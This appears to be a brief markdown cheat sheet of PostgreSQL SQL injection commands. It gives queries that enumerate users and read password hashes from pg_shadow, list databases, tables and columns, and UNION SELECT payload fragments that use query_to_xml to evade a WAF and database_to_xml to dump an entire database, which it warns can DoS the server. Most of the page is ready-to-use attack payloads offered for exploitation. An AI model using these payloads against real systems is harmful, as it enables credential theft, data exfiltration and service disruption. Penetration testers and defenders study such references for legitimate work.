---
title: "PostgreSQL"
description: "PostgreSQL commands to extract data while exploiting SQL injection"
date: 08/09/2020
categories:
 - SQL
tags:
 - postgresql
 - sql
 - sql-injection
---


## Injection SQL

### Cheat Sheet

Here is some useful commands to deal with SQL injection:

| Detail                              | SQL command                                                                                          |
|:------------------------------------|:-----------------------------------------------------------------------------------------------------|
| Version                             | `SELECT version()`                                                                                   |
| List Users                          | `SELECT usename FROM pg_user`                                                                        |
| List users and passwords            | `SELECT usename, passwd FROM pg_shadow`                                                              |
| List Privileges                     | `SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user`                                      |
| Database Name                       | `SELECT current_database()`                                                                          |
| List databases                      | `SELECT datname FROM pg_database`                                                                    |
| List tables                         | `SELECT table_name FROM information_schema.tables`                                                   |
| List columns                        | `SELECT column_name FROM information_schema.columns WHERE table_name='data_table'`                   |
| Select nth row                      | `SELECT ... LIMIT 1 OFFSET {n}`                                                                      |
| Concatenate strings in the same row | `SELECT CONCAT(username, ', ', passwd) FROM pg_shadow`                                               |
| Concatenate column                  | `SELECT string_agg(column_name, ', ') FROM information_schema.columns WHERE table_name='data_table'` |



### XML functions

#### query_to_xml

The following functions map the contents of relational tables to XML values:

```sql
query_to_xml(query text, nulls boolean, tableforest boolean, targetns text)
table_to_xml(tbl regclass, nulls boolean, tableforest boolean, targetns text)
cursor_to_xml(cursor refcursor, count int, nulls boolean, tableforest boolean, targetns text)
```

With `query_to_xml` you can bypass WAF and exfiltrate the query results in a
single string:

```sql
... UNION SELECT '1', '2', query_to_xml('select * from pg_user', true, true, ''), '4', ...
```


#### database_to_xml

The following function may be available and returns the entire current database:

```sql
database_to_xml(nulls boolean, tableforest boolean, targetns text)
```

The exploitation is as follow. Be careful the process may timeout or DOS the
server:

```sql
... UNION SELECT '1', '2', database_to_xml(true, true, ''), '4', ...
```


### JSON functions

PostgreSQL implements JSON functions to interact with this data structure.


### to_jsonb - extract line as a JSON object

```sql
SELECT to_jsonb(t.*) FROM my_table t;
```

### jsonb_object_keys - extract columns names

```sql
SELECT jsonb_object_keys((SELECT to_jsonb(t.*) FROM my_table t LIMIT 1));
```
